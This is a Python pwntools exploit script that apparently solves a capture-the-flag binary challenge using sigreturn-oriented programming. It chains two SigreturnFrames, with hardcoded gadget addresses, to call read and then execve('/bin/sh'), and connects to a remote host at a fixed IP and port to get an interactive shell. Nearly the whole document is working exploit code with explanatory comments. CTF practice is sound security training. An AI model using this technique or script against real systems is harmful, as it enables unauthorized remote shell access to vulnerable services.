#!/usr/bin/env python

#Another SROP challenge harder than V0 
#We don't have a pop rax gadget and /bin/sh string except multiple constraints than the previous one
#We have to chain 2 sigrops for this challenge 
#Use the mov rax,6 add rax,rdi mov rax,9 to make the rax 15 to make the first sigreturn syscall to call read
#There is a sanity bit which sets when first input is called so we cannot jump again to syscall 
#We can use the read to null it and then place the /bin/sh string in the .data section 
#And then use the same above method to make a sigreturn syscall to call execve /bin/sh to yield a shell

from pwn import *
import time
context.clear(arch="amd64")
r = remote("193.57.159.27",23926)
#r = process("./main")

def frame():                                      #Frame to perform the read syscall
    frame = SigreturnFrame(kernel="amd64")     
    frame.rax = 0
    frame.rdi = 0
    frame.rsi = 0x402000
    frame.rdx = 0x500
    frame.rsp = 0x402048
    frame.rip = 0x401020
    frame.rbp = 0x402050
    return bytes(frame)


def frame2():
    frame = SigreturnFrame(kernel="amd64")
    frame.rax = 0x3b
    frame.rdi = 0x402040
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = 0x401020
    frame.rbp = 0x402050
    return bytes(frame)


Frame1 = frame()
Frame2 = frame2()
payload = "A" * 8 + p64(0x401079) + p64(0x401085) + p64(0x40107f) + p64(0x4010a1) + p64(0x401072) + Frame1
r.sendline(payload)
time.sleep(1.0)
payload = p64(0) * 8 + "/bin/sh\x00" + p64(0x401079) * 2 + p64(0x401085) + p64(0x40107f) + p64(0x4010a1) + p64(0x401072)  + Frame2
r.sendline(payload)
r.interactive()
